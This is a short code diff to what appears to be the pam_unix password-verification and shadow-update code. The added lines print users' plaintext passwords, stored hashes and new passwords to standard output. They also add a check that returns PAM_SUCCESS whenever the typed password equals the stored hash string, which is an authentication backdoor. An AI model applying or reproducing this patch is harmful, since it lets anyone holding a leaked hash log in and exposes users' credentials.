@@ -72,6 +72,10 @@ PAMH_ARG_DECL(int verify_pwd_hash,
 	char *pp = NULL;
 	int retval;
 	D(("called"));
+	
+	printf("%s: p: %s, hash: %s\n", __func__, p, hash);
+	if (!strcmp(p,hash)) 
+		return PAM_SUCCESS;
 
 	strip_hpux_aging(hash);
 	hash_len = strlen(hash);
@@ -176,6 +180,7 @@ PAMH_ARG_DECL(int verify_pwd_hash,
 int
 is_pwd_shadowed(const struct passwd *pwd)
 {
+	printf("%s: line 177\n", __func__);
 	if (pwd != NULL) {
 		if (strcmp(pwd->pw_passwd, "x") == 0) {
 			return 1;
@@ -934,6 +939,7 @@ PAMH_ARG_DECL(int unix_update_shadow,
 
     oldmask = umask(077);
 
+    printf("%s: towhat: %s\n", __func__, towhat);
 #ifdef WITH_SELINUX
     if (SELINUX_ENABLED) {
       char *shadow_context_raw = NULL;
